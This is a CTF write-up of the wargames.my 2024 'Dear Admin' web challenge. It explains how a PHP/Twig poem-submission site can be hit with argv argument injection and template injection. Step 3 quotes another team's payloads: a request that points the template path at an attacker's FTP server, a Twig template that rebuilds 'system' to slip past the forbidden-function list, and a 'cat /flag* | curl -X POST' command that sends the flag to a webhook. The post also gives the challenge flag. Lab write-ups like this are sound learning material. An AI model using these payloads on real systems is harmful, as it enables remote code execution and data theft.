---
title:  "wargames.my 2024 (Student Category) - Writeup (Web Exploitation - Dear Admin)"
date:   2024-12-29 22:45:00 +0800
categories: [CTF Writeup, Web Exploitation]
tags: [wargames.my 2024]
---
>This challenge was completed after the CTF ended.
{: .prompt-info }

Here is a bit of writeup produced here.

## The Problem

We were the site source code and a website where we could submit a poem and it will upload and parse as `.html` file.

![](/assets/img/image7.png)

The source code given are for setuping the full docker image.

Here are the steps I've taken in this challenge.

## Step 1 (Initial Analysis)

First, I will take a look at what we would exploit. Before this CTF, I've just joined a session of one of the participants of MSC 2023 which explain current trends of web exploitation and one of it was template injection.

At first, I thought was like local file travesal but I was wrong. It is indeed template injection. The method used are quite similar to the one I heard before. But, what makes it hard is how we going to transfer out the flag.

First, I take a look what could be found here. Since the source code are given, we will analyse the code given until we reached the flag.



## Step 2 (Analyse the provided Source Code)

So, now let's analyse the source code given. the file directory is as below.

```
|
|-- templates
|   |-- admin_review.twig
|
|-- index.php
|-- admin.php
|-- config.php
|-- DockerFile
|-- (other unlisted folders containing configs
|
```

Here are the source codes.

index.php

```php
<?php
session_start();

$message = isset($_SESSION['message']) ? $_SESSION['message'] : '';
$status = isset($_SESSION['status']) ? $_SESSION['status'] : '';
unset($_SESSION['message'], $_SESSION['status']);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['poem'])) {
    $poem = trim($_POST['poem']);
    
    if (empty($poem)) {
        $_SESSION['message'] = 'Please enter a poem.';
        $_SESSION['status'] = 'error';
    } else {
        $ch = curl_init('http://localhost/admin.php?poem=' . urlencode($poem));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        
        if ($response === false) {
            $_SESSION['message'] = 'Connection error: ' . curl_error($ch);
            $_SESSION['status'] = 'error';
        } else {
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $result = json_decode($response, true);
            
            if ($result === null) {
                $_SESSION['message'] = 'Invalid response from server: ' . $response;
                $_SESSION['status'] = 'error';
            } else if ($httpCode === 200) {
                $_SESSION['message'] = $result['message'];
                $_SESSION['status'] = $result['status'];
                if (isset($result['review_link'])) {
                    $_SESSION['review_link'] = $result['review_link'];
                }
            } else {
                $_SESSION['message'] = 'Server error (HTTP ' . $httpCode . ')';
                $_SESSION['status'] = 'error';
            }
        }
        curl_close($ch);
    }
    
    if (headers_sent()) {
        echo "<script>window.location.href='index.php';</script>";
        exit;
    }
    
    header('Location: index.php');
    exit;
}

$review_link = isset($_SESSION['review_link']) ? $_SESSION['review_link'] : '';
unset($_SESSION['review_link']); 
?>

<!DOCTYPE html>
<html>
<head>
    <title>Submit Your Poem</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            line-height: 1.6;
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem 20px;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
        }

        .container {
            background: white;
            padding: 3rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
        }

        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 2.5rem;
            font-size: 2.2rem;
        }

        .poem-form {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
            max-width: 800px;
            margin: 0 auto;
        }

        textarea {
            width: 100%;
            min-height: 300px;
            padding: 1.2rem;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            line-height: 1.8;
            resize: vertical;
            transition: all 0.3s ease;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
        }

        textarea:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 8px rgba(52,152,219,0.2);
        }

        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            align-self: center;
            min-width: 200px;
        }

        button:hover {
            background-color: #2980b9;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(52,152,219,0.2);
        }

        .alert {
            padding: 1rem;
            border-radius: 5px;
            margin-bottom: 1rem;
            text-align: center;
        }

        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .info {
            color: #666;
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Submit Your Poem</h1>
        
        <?php if ($message): ?>
            <div class="alert <?php echo htmlspecialchars($status); ?>">
                <?php echo htmlspecialchars($message); ?>
                <?php if ($review_link): ?>
                    <br><br>
                    <a href="<?php echo htmlspecialchars($review_link); ?>" target="_blank">View your submission</a>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <form class="poem-form" action="index.php" method="POST">
            <textarea 
                name="poem" 
                required 
                placeholder="Type your poem here..."
            ></textarea>
            <button type="submit">Submit Poem</button>
        </form>

        <p class="info">
            Your poem will be reviewed before publication.
        </p>
    </div>
</body>
</html>
```
{: file='index.php'}

admin.php

```php
<?php

// Check if request is from localhost
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
    http_response_code(403);
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Forbidden: Access only allowed from localhost'
    ]);
    exit;
}

require_once 'config.php';

// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

header('Content-Type: application/json');

if (!isset($_GET['poem'])) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'message' => 'Invalid request'
    ]);
    exit;
}

$poem = trim($_GET['poem']);
$uniqueId = uniqid('poem_', true);
$evaluation = [
    'length' => strlen($poem),
    'lines' => count(explode("\n", $poem)),
    'words' => str_word_count($poem)
];

$isAcceptable = $evaluation['words'] >= 10 && $evaluation['lines'] >= 3;

if ($isAcceptable) {
    try {

        if (!function_exists('renderTemplate')) {
            throw new Exception("renderTemplate function is not defined");
        }
        
        $htmlContent = renderTemplate('admin_review', [
            'poem' => [
                'content' => htmlspecialchars($poem),
                'id' => htmlspecialchars($uniqueId),
                'evaluation' => [
                    'length' => (int)$evaluation['length'],
                    'lines' => (int)$evaluation['lines'], 
                    'words' => (int)$evaluation['words']
                ],
                'status' => 'pending',
                'submitted_at' => date('Y-m-d H:i:s')
            ]
        ]);

        if (empty($htmlContent)) {
            throw new Exception("Template rendering produced empty content");
        }

        $reviewPath = __DIR__ . '/reviews'; 
        if (!is_dir($reviewPath)) {
            mkdir($reviewPath, 0755, true);
        }
        
        $filePath = $reviewPath . '/' . $uniqueId . '.html';

        file_put_contents($filePath, $htmlContent);

        $response = [
            'status' => 'success',
            'message' => 'Thank you! Your poem has been accepted for review.',
            'review_link' => '/reviews/' . $uniqueId . '.html' 
        ];
    } catch (Exception $e) {
        
        $response = [
            'status' => 'error',
            'message' => 'An error occurred while processing your poem. Debug: ' . $e->getMessage()
        ];
        
        header('HTTP/1.1 500 Internal Server Error');
        echo json_encode($response);
        exit;
    }
} else {
    $response = [
        'status' => 'error',
        'message' => 'Your poem is too short. Please ensure it has at least 10 words and 3 lines.'
    ];
}

echo json_encode($response);
```
{: file='admin.php'}

config.php

```php
<?php

error_reporting(E_ERROR | E_PARSE);

require_once __DIR__ . '/vendor/autoload.php';

// Site configuration
define('SITE_URL', '');
define('REVIEW_DIR', __DIR__ . '/reviews');
define('CACHE_DIR', __DIR__ . '/cache');

$templatePath = getCliOption('templatesPath');

if ($templatePath) {
    try {
        $templatePath = validatePath($templatePath);
        $loader = new \Twig\Loader\ArrayLoader([
            'dynamic_template' => $templatePath
        ]);
        $twig = new \Twig\Environment($loader, [
            'auto_reload' => true
        ]);
    } catch (InvalidArgumentException $e) {
        die('Invalid template file: ' . $e->getMessage());
    }
} else {
    $loader = new \Twig\Loader\FilesystemLoader(__DIR__ . '/templates');
    $twig = new \Twig\Environment($loader, [
        'auto_reload' => true
    ]);
}

function renderTemplate($template, $data) {
    global $twig, $templatePath;
    if ($templatePath) {
        return $twig->render('dynamic_template', $data);
    }
    return $twig->render($template . '.twig', $data);
}

function getCliOption($name) {
    if (!ini_get('register_argc_argv')) {
        return null;
    }

    if (!empty($_SERVER['argv'])) {
        foreach ($_SERVER['argv'] as $i => $arg) {
            $arg = urldecode($arg);
            
            if ($arg === $name || $arg === "-$name" || $arg === "--$name") {
                return isset($_SERVER['argv'][$i + 1]) ? urldecode($_SERVER['argv'][$i + 1]) : true;
            }
            
            if (strpos($arg, "$name=") === 0 || 
                strpos($arg, "-$name=") === 0 || 
                strpos($arg, "--$name=") === 0) {
                $value = substr($arg, strpos($arg, '=') + 1);
                return urldecode($value);
            }
        }
    }
    
    return null;
}

function validatePath($path) {
    if (!file_exists($path . "/admin_review.twig")) {
        throw new InvalidArgumentException("Template file does not exist: $path");
    }
    
    $content = @file_get_contents($path . "/admin_review.twig");
    if ($content === false) {
        throw new InvalidArgumentException("Cannot read template file: $path");
    }
    
    checkTemplateContent($content, $path . "/admin_review.twig", 'template');
    
    return $content;
}

function checkTemplateContent($content, string $path, string $type): void {
    $forbidden = [
        'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
        'assert', 'pcntl_exec', 'eval', 'call_user_func', 'ReflectionFunction','filter','~'
    ];

    foreach ($forbidden as $word) {
        if (stripos($content, $word) !== false) {
            http_response_code(403);
            die("Oh no! 😭 You tried to use the forbidden word '$word'! The admin is very sad now... 😢");
        }
    }
}
```
{: file='config.php'}

So, far the few things that we could see as interesting is where would the code render the template. That is our point of injection for getting Remote Code Execution (RCE).

In `config.php` file,
```php
...

$templatePath = getCliOption('templatesPath');

if ($templatePath) {
    try {
        $templatePath = validatePath($templatePath);
        $loader = new \Twig\Loader\ArrayLoader([
            'dynamic_template' => $templatePath
        ]);
        $twig = new \Twig\Environment($loader, [
            'auto_reload' => true
        ]);
    } catch (InvalidArgumentException $e) {
        die('Invalid template file: ' . $e->getMessage());
    }
} else {
    $loader = new \Twig\Loader\FilesystemLoader(__DIR__ . '/templates');
    $twig = new \Twig\Environment($loader, [
        'auto_reload' => true
    ]);
}

function renderTemplate($template, $data) {
    global $twig, $templatePath;
    if ($templatePath) {
        return $twig->render('dynamic_template', $data);
    }
    return $twig->render($template . '.twig', $data);
}

...
```
{: file="config.php"}

Here, `config.php` accepts arguments `templatePath` where we can manipulate the path of the code. But, the path is being checked if the path contains `admin_review.twig` file. And the template file does not contain any terminal-related commands for execution.

```php
...

function validatePath($path) {
    if (!file_exists($path . "/admin_review.twig")) {
        throw new InvalidArgumentException("Template file does not exist: $path");
    }
    
    $content = @file_get_contents($path . "/admin_review.twig");
    if ($content === false) {
        throw new InvalidArgumentException("Cannot read template file: $path");
    }
    
    checkTemplateContent($content, $path . "/admin_review.twig", 'template');
    
    return $content;
}

function checkTemplateContent($content, string $path, string $type): void {
    $forbidden = [
        'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
        'assert', 'pcntl_exec', 'eval', 'call_user_func', 'ReflectionFunction','filter','~'
    ];

    foreach ($forbidden as $word) {
        if (stripos($content, $word) !== false) {
            http_response_code(403);
            die("Oh no! 😭 You tried to use the forbidden word '$word'! The admin is very sad now... 😢");
        }
    }
}
```
{: file="config.php"}

Now, we would think that how would we achieve the execution via template. In config.php, the function `renderTemplate` aren't being called but instead being call in `admin.php`. So we proceed on analysing the file next.

```php
// Check if request is from localhost
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1') {
    http_response_code(403);
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Forbidden: Access only allowed from localhost'
    ]);
    exit;
}

require_once 'config.php';

...

 $htmlContent = renderTemplate('admin_review', [
            'poem' => [
                'content' => htmlspecialchars($poem),
                'id' => htmlspecialchars($uniqueId),
                'evaluation' => [
                    'length' => (int)$evaluation['length'],
                    'lines' => (int)$evaluation['lines'], 
                    'words' => (int)$evaluation['words']
                ],
                'status' => 'pending',
                'submitted_at' => date('Y-m-d H:i:s')
            ]
        ]);

...
```
{: file="admin.php"}

In `admin.php`, the file can only be called within `localhost` which limits our reach. Since `renderTemplate` are being used here, we need to find a way to pass the data to config.php. `config.php` are being included here meaning the code in that file will be running in this file as well which we need to focus on this file.

Using upload peom function on `index.php`, we can't really upload the template file onto the server to execute the file. From the session I've been before, the speaker also shows using `ngrok` to supply the file to the server, but the question remains `how?`.

Going through the `DockerFile`, we seeing some weird configs for the php.

```
RUN echo "register_argc_argv=On" > /usr/local/etc/php/conf.d/register-argc-argv.ini
```
{: file="DockerFile"}

this feature flag (`register_argc_argv=On`) is being turned on in the `DockerFile`. So i was curious as well. In `config.php`, this (argument i guess? - why wouldn't it be enabled by default?) this args are being mentioned as well.

```php
...
if (!ini_get('register_argc_argv')) {
        return null;
    }
...
```
{: file="config.php"}

This is part of the `getCliOption` function which seems to get the arguments passed to the php during call out.

Up to this point, I didn't get the clue of how to plan for the execution. Since it's been a while I've joined a CTF, this challenge has proven me that it is very hard tho even if it is set as `medium challenge` by the organizers.

Thanks to a discord member (`vicevirus`) shared a hint on how to solve it after the CTF ends.

Reference: [https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

Based on this, it appears that this challenge is based on a newly solved CVE on `craft CMS`. TLDR; it uses the same `templatePath` to supply the template file via `ftp` and the server reads and execute. The issue was due to the feature flag we discussed before being turned on and arguments are being passed into the web application causing like RCE-like exploit. You can read more on their site how the exploit works and why using `ftp` instead of `http` protocol.

Even with the clue, I tried every possibility and failed to try supply the `ftp` link from the `index.php` in order to pass to the `admin.php`. All my methods were right but I haven't have good knowledge how to do so. So, here a bit of summary of what I've done and some solution provided via writeup by other teams.

## Step 3 (Exploiting the template renderer)

The server uses `Twig` in order to render the template. For template injection, regradless of template renderer library, you can exploit it either using some sort of LFI or RCE. Some challenges might include CVEs of the library used and some might just create or use any vulnerability to still allow template injection which makes it a bit hard.

The steps taken are first, we need to have a PoC first to see if we can pass the link. The first method would by passing through the `poem`. This step I was right along but the issue is this.

```php
...
$ch = curl_init('http://localhost/admin.php?poem=' . urlencode($poem));
...
```
{: file="index.php"}

The argument `poem` are first going through `urlencode()` function in my first attempt was going to manipulate the `poem` to send another argument with the `poem` which is `templatePath`. How did you ask? In url, we use `&` to supply multiple arguments. But, the issue is that `urlencode()` would encode the symbols which makes it the whole string of words are being attributed to poem which makes it useless.

Again, I was stuck again here. But, because this writeup were published :). Of course there we'll be a solution. We're going to reference based on a team (`That time i was reincarnated as a CTF player` - goofy ah team name but still no 1) writeup.

Reference: [https://hackmd.io/@vicevirus/SJx3GNKaHJg#Dear-Admin](https://hackmd.io/@vicevirus/SJx3GNKaHJg#Dear-Admin) - general writeup / [https://vicevirus.github.io/posts/wgmy-2024-web-writeup/#Dear%20Admin%20🩸](https://vicevirus.github.io/posts/wgmy-2024-web-writeup/#Dear%20Admin%20🩸) - a more detailed writeup by `vicevirus`

Their team uses `--` (double dash) since this dash aren't encoded by the function.

>EDIT: The reason the double dash works here is due to the code in `config.php` when checking for the argv_argc argument. The code itself will run again `urlencode()` when it sees `$name` (no dash), `-$name` (single dash) and `--$name` (double dash)
>```
> function getCliOption($name) {
>    if (!ini_get('register_argc_argv')) {
>        return null;
>    }
>
>    if (!empty($_SERVER['argv'])) {
>        foreach ($_SERVER['argv'] as $i => $arg) {
>            $arg = urldecode($arg);
>            
>            if ($arg === $name || $arg === "-$name" || $arg === "--$name") {
>                return isset($_SERVER['argv'][$i + 1]) ? urldecode($_SERVER['argv'][$i + 1]) : true;
>            }
>            
>            if (strpos($arg, "$name=") === 0 || 
>                strpos($arg, "-$name=") === 0 || 
>                strpos($arg, "--$name=") === 0) {
>                $value = substr($arg, strpos($arg, '=') + 1);
>                return urldecode($value);
>            }
>        }
>    }
>    
>    return null;
>}
> ```
>{: file="config.php"}
{: .prompt-info}

Reference: [https://www.geeksforgeeks.org/php-urlencode-function/](https://www.geeksforgeeks.org/php-urlencode-function)

>The urlencode() function is an inbuilt function in PHP which is used to encode the url.
>
>This function returns a string which consist all non-alphanumeric characters except -_. and replace by the percent (%) sign followed by two hex digits and spaces encoded as plus (+) signs."

Thus, it would it work. I also tried this but no avail as well. So, here are their payload.

```
poem=Roses+are+red%0AViolets+are+blue%0ASugar+is+sweet+--templatesPath=ftp://anonymous:@<hostedserverip>:2121/
```

Based on `admin.php`, the poem needs to have certain amout of words & lines thus the words and spaces are created. Included there is a `templatePath` argument which points to their `ftp` instance. 

As for their payload, here are their payload.

{% raw %}
```
{% set cmd = ['s','y','s','t','e','m']|join('') %}
{{ ['cat /flag* | curl -X POST -d @- https://webhook.site/062c9157-61d7-4417-95f6-dd084c2b0c89'] | map(cmd) }}
```
{% endraw %}

They used `set cmd` to by pass the check of words that are disallowed in `config.php`.

```php
...
  $forbidden = [
        'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open',
        'assert', 'pcntl_exec', 'eval', 'call_user_func', 'ReflectionFunction','filter','~'
    ];
...
```
{: file="config.php"}

Other than that, they read the `flag.txt` which is at the root of the server and decided to post to their webhook. Here I realised that the code does not push the content of resulting template rendered to the user. Thus, using a webhook is a kinda a creative idea.

Thus, you'll get the flag here.

```
wgmy{eae236d68a96aed8af76923357728478}
```

## Closing

So far, I think I will need more knowledge in order to be superior on this one. I decided to take on web challenges instead of other challenges because I thought I was good in web development so I might stand a chance. But, still it is a long way to go and a lot to learn. I didn't get to solve this one but almost I think. I might rewrite this because the content is really messy tho. Okay that's all folks. See you in the next one. Happy new year! 
